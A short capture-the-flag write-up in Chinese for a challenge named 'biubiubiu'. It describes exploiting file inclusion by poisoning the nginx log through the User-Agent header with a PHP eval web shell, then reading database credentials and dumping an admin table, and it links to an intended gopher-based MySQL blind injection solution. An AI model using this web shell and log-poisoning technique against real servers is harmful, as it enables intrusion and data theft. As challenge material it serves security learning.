## Title
biubiubiu

## Steps
* 非预期解:
文件包含，fuzz发现可包含nginx的日志文件，于是修改UA为```<?php eval($_REQUEST[test]);?>```即可getshell,查看conn.php文件可以获得mysql的连接信息，于是写php脚本连接mysql服务器，发现数据表名为admin，获取admin表内的所有信息即可获得flag.  
conn.php
```php
$db_host = 'mysql';
$db_name = 'user_admin';
$db_user = 'Dog';
$db_pwd = '';

$conn = mysqli_connect($db_host, $db_user, $db_pwd, $db_name);

if(!$conn){
    die(mysqli_connect_error());
}
```
eval的脚本：
```php
<?php
$servername = "localhost";
$username = "Dog";
$password = "";
$dbname = "user_admin";

$conn = mysqli_connect($servername, $username, $password, $dbname);

 
$sql = "SELECT * from admin";
$result = mysqli_query($conn, $sql);

while($row = mysqli_fetch_assoc($result)) print_r($row);

?>
```

* 预期解：
[记一次利用gopher的内网mysql盲注](https://www.jianshu.com/p/6747fbc7b289)
